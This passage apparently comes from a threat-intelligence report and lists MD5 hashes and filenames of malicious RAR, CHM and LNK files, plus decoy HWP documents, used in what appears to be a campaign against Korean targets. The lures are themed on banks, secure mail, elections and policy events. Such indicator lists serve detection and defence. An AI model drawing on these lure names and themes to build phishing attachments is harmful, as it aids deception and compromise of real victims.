| e32f59fd5acbe01d2171ba6c2f24e3ca | Announcement.rar                                           |
| 7b60dc663e1025e8892b96fa9fc34f00 | BoanMail.rar                                               |
| 5e95023c6ac3f3fefe00cfc2b4b1d093 | CR_20230126.rar                                            |
| 353370ade2a2491c29f20f07860cf492 | CV.rar                                                     |
| 120a677df1c4d1f0792b6547d3b60183 | DBLife-2022_08_05.rar                                      |
| 02baa23f3baecdc29d96bffea165191b | Details.rar                                                |
| c3325c43b6eea2510f9c9f1df7b7ce22 | Documents.rar                                              |
| 04a7290e04fd1855140373aa3d453cef | DriverSet.rar                                              |
| 87c3e8e4308aac42fed82de86b0d4cb6 | Estimate.rar                                               |
| 328dc6e7acce35abaaf3811bac2bc838 | H2O 견적서.rar                                                |
| e9230cf7615338ab037719646d67351b | HealthDoc.rar                                              |
| cf012ca48b5e1f6743be7e0d10cdfd2e | Introduce.rar                                              |
| 34d3e5306cff0bfe831ccd89d095ef33 | Invoice_1514_from_Evo3_Marketing_Inc.rar                   |
| 717dab257423d5fd93d0d02f3ff242e7 | KB_20220111.rar                                            |
| 0164d8a2d27cfd312fb709c60c351850 | KB_20230126.rar                                            |
| c23c17756e5ccf9543ea4fb9eb342fde | KN0408_045 정영호.rar                                         |
| 31793153b12f1187287007578017abd4 | KakaoTalk_20220419_103447534.rar                           |
| 030df9bca0a35bcd88d5897482ee226d | LG유플러스_이동통신_202207_이_선.rar                                 |
| 8eb56493d984b3c2fa4c2dedb6871dd7 | LG유플러스_이동통신_202208_이_선.rar                                 |
| 0c2375825dcae816a1f9b53f8f82d705 | MAIL_20230125151802.rar                                    |
| 93817f6dfe3a7596eeef049eda9c8b18 | Message.rar                                                |
| 3fe6722cd256d6d5e1d5f5003d6a01a5 | NTS_eTaxInvoice.rar                                        |
| c1b6390f0ef992571fa9ed3c47eb0883 | News about Foreign affairs, The High North and Ukraine.rar |
| 6dc7795dde643aae9ced8e22db335ad1 | Oxygen_Generator.rar                                       |
| 3b52f149e220da28bf9cd719570979ce | Payment.rar                                                |
| e5c509a33db926f3087c3a52546b71f2 | Provincil's letter.rar                                     |
| d5ad2c1790c715d88b5e05ca4329417d | References.rar                                             |
| 4d27d6b01f85a4b40650e6bc7cc18ed3 | SamsungLife.rar                                            |
| 3a4f4b1fb30fbb70c14dea600a56ca68 | SecureMail.rar                                             |
| 5a8bdfb0008767cdb05dfcc3223e9a70 | TermsOfService.rar                                         |
| 881ccfd6c11b774b80b304ab78efef53 | Transaction.rar                                            |
| f2be2c1e80769a45761d0b69a46a627f | TransactionGuide.rar                                       |
| f7a73eaf15ee8d8f3257a359af5987eb | WooriCard_14day_20220609.rar                               |
| b6c4137868e2c305241093e967b2d60b | WooriCard_20211222.rar                                     |
| 715d408b45e5334a985e7e6279fa80ac | WooriCard_20220401.rar                                     |
| b2ce0ba21ae1e982a3a33a676c958bec | XQQ-2022-D27.rar                                           |
| b9f423b42df0df0cb5209973345d267c | [INSS] National Security and Strategy (Winter 2022).rar    |
| ab0dc3964a203eea96a233c8d068de95 | [붙임] 제20대 대통령선거 제1차 정책토론회 시청 안내문.rar                       |
| fbc339cd3f4d39af108b4fdb70202b22 | boanmail-202101-j08.rar                                    |
| fbc339cd3f4d39af108b4fdb70202b22 | boanmail_202201_2_505824.rar                               |
| 0db43beb06845026cf33c59baa66b393 | boanmail_202201_5_02-10424.rar                             |
| 237bcbe07219eb24104815205cc01d24 | boanmail_202201_5_80222982.rar                             |
| 2bf05e2526911b3bdb7f77cbbe4155f3 | db-fi.rar                                                  |
| 0923c69808352feb9a57a766c611b7d4 | dbins_secure.rar                                           |
| 8c3bb54dcd4704a0f0b307863345c5d1 | email_1649225531086.rar                                    |
| 0947efee85596a17bdd1e798826d48aa | enkis.rar                                                  |
| 93675086f33fb0708982eafea5568f05 | final exam questions 2022 summer  KED.rar                  |
| 8faabae5e6766a6a93a56014cca5c295 | hi_security_mail.rar                                       |
| 9e7099b32f6bd36724a71f6c3cb21d17 | issue.rar                                                  |
| 9c6d553682813724424a7fcc7af8729d | mmexport1638437859483.rar                                  |
| 6da10cc37edee7e16c520f2f95cd9304 | pay_202111_5_00-10290.rar                                  |
| f07a3d146f32bfa8f53e5cae7178559e | pay_202111_5_01-10104.rar                                  |
| 0beeb858734cd7da03b1284e7fe00b22 | pay_202111_5_02-12972.rar                                  |
| 8c4cbe900cf69c739882cef844b1ac11 | pay_202111_5_04-10220.rar                                  |
| 31da11dbf80715138261904b2249a7f8 | pay_202111_5_04-14213.rar                                  |
| 1803d81e1d0ccb91c752ecb4bc3b6f0c | pay_202111_5_12-11985.rar                                  |
| 06b7207879bd9ed42b323e16bb757a3c | pay_202202_5_06-10325.rar                                  |
| 28b807be70e49ebc0c65455f430d6408 | pay_202205_5_01-10104.rar                                  |
| c97a32c7555fc81f296fee0a65fec079 | pay_202209_5_01-502479.rar                                 |
| 1e05dbe1846c1704b9a7a1db13fdd976 | samsungfire.rar                                            |
| 38d9ff50b68144a9a40d1e7e3d06adb0 | security-guide.rar                                         |
| f0b7abea21984790d2906adf9653c542 | securityMail.rar                                           |
| 04802790b64d66b9257ae119ee7d39a5 | security_20220813.rar                                      |
| a8bcbb34e11d7b23721ec07eadb5ddc5 | shinhancard_20220218.rar                                   |
| eecf78848dde0d41075e35d3aa404697 | 제39기 모집요강 및 입학지원서-재송.rar                                   |
| ef5aa1dfbfc4c9128a971e006da0cb8b | 새로 바뀐 COVID-19 시기 자가격리 정책.rar                              |
| e5865d8cee159ac02ee53ef52f4058ac | 오피스 365 + 설치설명서 입니다.rar                                    |
| 882d4d6528404c3ceacee099f59bfab4 | 텅스텐 W 99.rar                                               |
| b7275a3931fb85f723a4ceec9478c89e | 다문화 문제 답.rar                                               |
| f96fa367261df9cc2b021318ce361ec6 | 취임식 관련 자료.rar                                              |
| 8d7141882a95be5dcfa8ce90d7079541 | 공고문(기술관리).rar                                              |
| ff2ccc12007bbf3f5934a5dfdc8430ee | 황선국-차예실의 요르단 이야기-34.rar                                    |
| 3c3fc3f47abf0ec7a3ab797b21b123e2 | 공고문.rar                                                    |
| acf9bad00bc1d2649ad918b0524c7761 | 계약사항 안내문.rar                                               |
| cb33ef9c824d16ff23af4e01f017e648 | 문의사항.rar                                                   |
| 802bf381dd7f7f6cea077ab2a1814027 | 보안메일.rar                                                   |
| 89d1888d36ff615adf46c317c606905e | 협조요청.rar                                                   |
| 0d15b99583b3b9638b2c7976b4a1d2ef | 통일교육11.rar                                                 |
| 8113798acc4d5690712d28b39a7bb13a | 백산연구소 (830 LNG) 22.01.17.rar                               |
| 4987ed60bb047d4ca660142b05556125 | 백산연구원 소방서.rar                                              |
| b840485840480d42b3b8e576eecdf2ee | 제로깅크루_명단.rar                                               |
| e8ab4f80ebad24260869e89bca69957d | 폴리프라자Ⅲ, 4월 근무 현황.rar                                       |
| 87aaf50fc5024b5e18f47c50147528b4 | 조성호기자님_마키노기자책소개.rar                                        |
| 11b0c0577e12400cddc7b62b763a1dd1 | 사업유치제의서-PC모듈러pdf.rar                                       |
| fa797b29229613f054378c8a32fcefbc | 통일미래최고위과정_입학지원서.rar                                        |

## CHM file hashes  
 

|   |   |
|---|---|
|**MD5 hash**|**Filename**|
|914521cb6b4846b2c0e85588d5224ba2|(20220120)2022 - 001.chm|
|2ffcb634118aaa6154395374f0c66010|(양식) 제20대 대통령 취임식 재외동포 참석자 추천 명단(국민의힘당원 000).chm|
|24daf49d81008da00c961091cbfc8438|0-Introduction.chm|
|624567dae70fc684b2a80b5f0f1de46d|1.Brefing.chm|
|2ab575f9785239d59395ec501ceaec2e|2017 - APEC.chm|
|684a61eedb2ec26d663c3d42a107f281|2022 - Guide.chm|
|a48ac5efd350341beab9a4fdfb7f68d7|2022-01-27-notification.chm|
|030c3873f1a45eab56dca00fa8fa9a14|2022-04-14.chm|
|a6b30fc17d6ff9aa84fb93c3f05a4171|2022-06-24-Document.chm|
|b4adb4fede9025f6dd85faac072a02e7|2022-Important.chm|
|b2d7c047dc1c7fb7074111128594c36e|2022.04.27.chm|
|edb87c2cabcc402173fa0153f4e8ae26|2022.chm|
|d020d573d28e3febb899446e3a65e025|20220315-112_Notice.chm|
|7058661c3f944f868e5a47c4440daa9b|20220510_115155.chm|
|d431c37057303e5609f0bffa83874402|20220623103203983_6_조사표_기업용.chm|
|820d302655d5cd5dd67859f7a5cb74fe|20220913_Main.chm|
|8db5578f5245c805c785ae38ea8a1363|20220916_Password.chm|
|c29d11961b9662a8cb1c7edd47d94ae5|20230302_Guide.chm|
|cae4d578b1bdaa4e193095f035cecbc6|Account Information.chm|
|9bf4576a1381c15c08060ca6cfd59949|BoanMail.chm|
|c0bfb9f408263c1bc574a08fa164a61f|BookBriefing.chm|
|e9562655c36d46f4b6534f189ae453a0|Content-Introducing.chm|
|6bd63cf73cab3305686f2ee41d69bd42|Covid-19-Notice20211028.chm|
|012f0dd04c9c810c14cdde08cfbca3c5|DBLife-2022_08_05.chm|
|00a7c9ad2e975e19034838a14f73a46a|Details.chm|
|77a6f57ccefeda14d5faf44cc37b69da|Estimate.chm|
|211b412fe5c4b207eb39384499b93342|H2O Note.chm|
|3a23ee36f792e241772e81aeeccf8aa8|Introduce.chm|
|532ec6d88c728afecfcf8fbb38fb8add|Invoice_1514_from_Evo3_Marketing_Inc.chm|
|2a982b843cf92081fc4202e11a1f7234|KB_20220111.chm|
|aa68044e16a115af4ea1de3d062c4e41|KB_20230126.chm|
|0bf53a165b2bd64be31093fefbb9fb51|KakaoTalk_20220419_103447534.chm|
|f11b9fb8208b9949859785810f251334|KakoBank-N202111.chm|
|097edc04368d411593fff1f49c2e1d9c|LG유플러스_이동통신_202207_이_선.chm|
|45bd3001517f5e913ddde83827f4cc29|MAIL_20230125151802.chm|
|0bf993c36aac528135749ec494f96e96|Message.chm|
|549162b9ec4c80f9a0ca410ff29c8e98|NTS_eTaxInvoice.chm|
|c09939e972432968976efc22f556bd0f|News about Foreign affairs, The High North and Ukraine.chm|
|79d5af9d4826f66090e4daf6029ed643|Password.chm|
|9e1a2b331fd1e4ee77880d8f62025cd1|Password12.chm|
|5f2dcb1e51c8d574f43c8f7c7f84d9fa|Related to the inauguration ceremony.chm|
|a5ce8fe31da94fdea9c25f3abcdd5982|SamsungLife.chm|
|8a74a931e6ed4ae477547707da2fd76c|SecureMail.chm|
|0012f5bfe97421d39751eb20d857ae09|TermsOfService.chm|
|22652b383d9ea880a4644a35cd5fadaf|Transaction.chm|
|73715c82e31702f56858226557f98444|WooriCard_14day_20220609.chm|
|b34761f5272c9109c47780f415d28631|WooriCard_20211222.chm|
|2c697d27cd2e455ae18b6744a47eef4f|WooriCard_20220401.chm|
|2cf2805529ebc68884979e582e12cf8d|XQQ-2022-D27.chm|
|67cc91e889b4a597a6486db0e92fa4d1|[INSS] Briefing and Guide.chm|
|1f4038a9c6266b60f784c37efbb832f5|[붙임] 제20대 대통령선거 제1차 정책토론회 시청 안내문.chm|
|ac7f8e5245f9736a1323509a537e54eb|baeksan (830 LNG) 22.01.17.chm|
|ee06a0d6e5645248db88c279ec0e8624|contents.chm|
|a13fb4e11b31d109a1b145f20ea4b929|db-fi.chm|
|0fb698efce9476c3f2b603b30f5e35d5|dbins_secure.chm|
|d942353d15077352dcae83dd04869e1a|email_1649225531086.chm|
|ac51f29d609c73cce8db67c86aa49ba0|enkis_choe.chm|
|7f030cbf7ce41b9eb15693ee92b637a5|hi_security_mail.chm|
|a85dc5403cb1fe7d0ae692a431e1eae3|issue.chm|
|5e2e5b71503adedf786bc69f3849750f|jungsan_202203_5_06-10325.chm|
|7cba0c911b74d889f05f8b954926aa67|jungsananne_202201_2_505824.chm|
|174ae3db1dd4c61037bc7a5bf71d1366|jungsananne_202201_5_02-10424.chm|
|498b20e20af190c6650f03e8adf9a5b7|jungsananne_202201_5_80222982.chm|
|92974d1677fa840fcc3d6599df86d38f|mmexport1638437859483.chm|
|19c0583e57385f574c9986de6a26adae|pay_202111_5_00-10290.chm|
|e73b6c906f1070d569a0e9b70304be01|pay_202111_5_01-10104.chm|
|b1d2c6233d56ef3aeaa08cff7a7d2971|pay_202111_5_02-12972.chm|
|c0d25429f924016765711cd860fd03f9|pay_202111_5_04-10220.chm|
|8a5e7f281b51c2b9e364c26e3f699019|pay_202111_5_04-14213.chm|
|faf6139671f07db49056f4e0470ab188|pay_202111_5_12-11985.chm|
|a372e8dfd1940ef4f9e74095a8bf3bd7|pay_202201_2_505824.chm|
|561b29a5650ff7fe6e63fa19c29ee240|pay_202201_5_02-10424.chm|
|093ad28a08314e8fe79c26828137ab0a|pay_202201_5_80222982.chm|
|d32ccdcf79932dd9d7eaf4fd75bfade2|pay_202202_5_06-10325.chm|
|deed5eb8b19dae07720e97b485a5f1e4|pay_202203_5_06-10325.chm|
|886702585a3951882801b9eecb76c604|pay_202205_5_01-10104.chm|
|6ac4b333e6d7f64aee5c32e20d624f2e|pay_202209_5_01-502479.chm|
|441adf67527915c09cfe29727b111a6a|samsungfire.chm|
|122208301a3727c5fc7794ff0f7947bf|security-guide.chm|
|79e158af8ded991ee95a0f10654576ce|securityMail.chm|
|e7104d3e388530a43623981138112e03|security_20220813.chm|
|af89179ef2c8365ca413fed8553159fa|shinhancard_20220218.chm|
|b7b1095620b8629c73191d5c05afc446|z email content.chm|
|681a21cb83e82da88f42f9fb0dd764b6|다문화 문제 답-추가.chm|
|5f2dcb1e51c8d574f43c8f7c7f84d9fa|취임식 관련 자료.chm|
|72a38aa3e128d2ffca141a41a4101dca|황선국-차예실의 요르단 이야기-34.chm|
|632104e97870c1177c211f5e2d963b75|요약문.chm|
|ffba3072600a1f06d260137f82371227|공지사항.chm|
|e557693cc879beeb1a455cac02724ea7|보안메일.chm|
|71389f565a5ebe573c94d688fa6f23ea|통일교육11.chm|
|920ccffa488d2b0e9aa19acc5f31fc3a|제로깅크루_명단.chm|
|7c53f15614d5f9cf2791cb31811893a7|폴리프라자Ⅲ, 4월 근무 현황.chm|
|fb60a976bbed174effa6081a35abee87|사업유치제의서-목차.chm|
|bca3f0b4a5a1cbcd3efa1ca0df7f0d4b|통일미래최고위과정_입학지원서.chm|

 
LNK files

| **MD5 hash**                     | **Filename**                                   |
| -------------------------------- | ---------------------------------------------- |
| eb7a6e3dc8bbc26f208c511ec7ee1d4c | LG유플러스_이동통신_202208_이_선.html.lnk |
| c5f954436e9623204ed961b9b33e769d | 계약사항 안내문_1.pdf.lnk                             |

> [!note]
> Please note that most of the HWP files mentioned below are clean decoy files used by the threat actor. The original filenames are included to give the reader insights into the themes used.


| **MD5 hash**                     | **Filename**                                                                              |
| -------------------------------- | ----------------------------------------------------------------------------------------- |
| 808fda00b7aa114182ba0ad9668ad4fb | (227183-F)_사업진행상태보고서.hwp                                                                  |
| 6566697d2b2b7b562f3e4f74986ae341 | 1.일반설계기준.hwp                                                                              |
| 70b327e1a2cf7863004436080848eddc | 2020_normal_ko.hwp                                                                        |
| b8addd3c9e0c7f1ed8d4aafcb582e755 | 2021년 ICT융합 스마트공장 구축 및 고도화 사업 최종감리보고서(엠플러스에프엔씨, 인버스, 정찬혁)_초안.hwp                          |
| 07ad22218f9dc7da63b880ae5a65a177 | 2022년 외국인 주민교류를 통한 기술인으로 진로 직업지도사업.hwp                                                    |
| de5319b8a5674994e66b8668b1d9884f | 220915 수정.hwp                                                                             |
| a4706737645582e1b5f71a462dd01140 | 3. 개인정보보완서약서_북주협.hwp                                                                      |
| d49ef08710c9397d6f6326c8dcbf5f4e | 3사복지업무홍보.hwp                                                                              |
| 96900e1e6090a015a893b7718d6295dd | K-MOOC 수기 공모 이벤트.hwp                                                                      |
| b35c3658a5ec3bd0e0b7e5c6c5bc936f | RFQ_소각 및 발전설비 건설공사-보고-0614-Ver1.hwp                                                       |
| 0ccb1c52b3de22b49756a2608cddd2e9 | UN 대북제재위원회 전문가 패널 보고서.hwp                                                                 |
| d891219a50b17724228f9ae8c7494bbf | UN 대북제재위원회 전문가 패널 보고서」요약.hwp                                                              |
| cac2d25c8e173c896eff0dd85f09c898 | [붙임] 제20대 대통령선거 제1차 정책토론회 시청 안내문-복사.hwp                                                   |
| ad922c7f0977c4aefcbc2c089cce8b66 | 제39기 모집요강 및 입학지원서-재송.hwp                                                                  |
| 48153ac26eb10473b60e4011f5e004e9 | 제8회 전국동시지방선거 제1차 정책토론회 시청 안내.hwp                                                          |
| 0de54a8109f54c99d375fc0595649175 | 논문 자료.hwp                                                                                 |
| 0de54a8109f54c99d375fc0595649175 | 사업 제안.hwp                                                                                 |
| bf478b6b500c53e05741e3955630182f | 오피스 365 + 설치설명서 입니다.hwp                                                                   |
| 7b29312a0f8d9a7d2354843f7c9c21ea | 텅스텐 W 99.hwp                                                                              |
| 6b8acab4941dcfb1dbe04bc9477e7605 | 다문화 문제 답(12. 5 업데이트).hwp                                                                  |
| 8591125c0a95f8c1b1e179901f685fa3 | 인터뷰(22. 9. 14).hwp                                                                        |
| f1bd01dc27fe813aeade46fe55bd9e2e | 황선국-차예실의 요르단 이야기-34.hwp                                                                   |
| ff072f99ea6d04c0a4ff0ab9d23440fc | 접수증-삼주글로벌 법인세 신고서 접수증.hwp                                                                 |
| 35f9802b98105fa72ec34d2b02649655 | 공고문.hwp                                                                                   |
| 5228e631cdd94ec8d8c9d68e044236f1 | 위임장.hwp                                                                                   |
| 5bdd6ad0c17ee2a1057bf16acb86f371 | 확인서.hwp                                                                                   |
| c09bedb49199b09bcb362ba5dadcd22a | 함께가는 평화의 봄_과업지시.hwp                                                                       |
| a2aeb5298413c2be9338084060db3428 | 동남아와 국제정치(기말레포트).hwp                                                                      |
| f8f994843851aba50ca35842b4cca8a3 | 행사안내.hwp                                                                                  |
| 6deceb3e2adff0481b30efe27e06542e | 백산연구원 소방서 제출용.hwp                                                                         |
| 0fd7e73e6672adaa1e5cf2dfca82e42e | 서식1, 4 강사이력서 및 개인정보동의서_북주협.hwp                                 |
| e5afbbfa62efd599a1ab2dade7461d62 | 폴리프라자Ⅲ, 4월 근무 현황.hwp                                                                      |
| 2e57c30259e5c33779940ce9a9f91378 | 산업가스용도.hwp                                                                                |
| c775aef36bc4b1b9a2b14fae46521c0e | 서영석고객님.hwp                                                                                |
| aa84bdaf877d70c744ce1982395ad37c | 자문결과보고서(양식).hwp                                                                           |
| 19dabc553ee3c3bcd166411365e2dd56 | 비대면_서비스_보안_취약점_점검_신청서.hwp                                         |
| 6bf6de967ca6324106a0700715a9e02b | 중고맨거래명세서.hwp                                                                              |
| 0bcda05d3f4054dd5fb571a634afe10a | 정기총회안내공문_2022.hwp                                                                         |
| 68603ba44b58f4586deeb571cf103e0c | 통일미래최고위과정_입학지원서_양식.hwp                                                                    |
| 670f8697d7c46757745be0322dfdd2ab | 노원도시농업네트워크.hwp                                                                            |
| c47428fe38bec9424b75aa357113d9dc | 사단법인 공문 (2022.12호)_2022년도 평화통일교육사업 함께가는 평화의 봄.hwp |
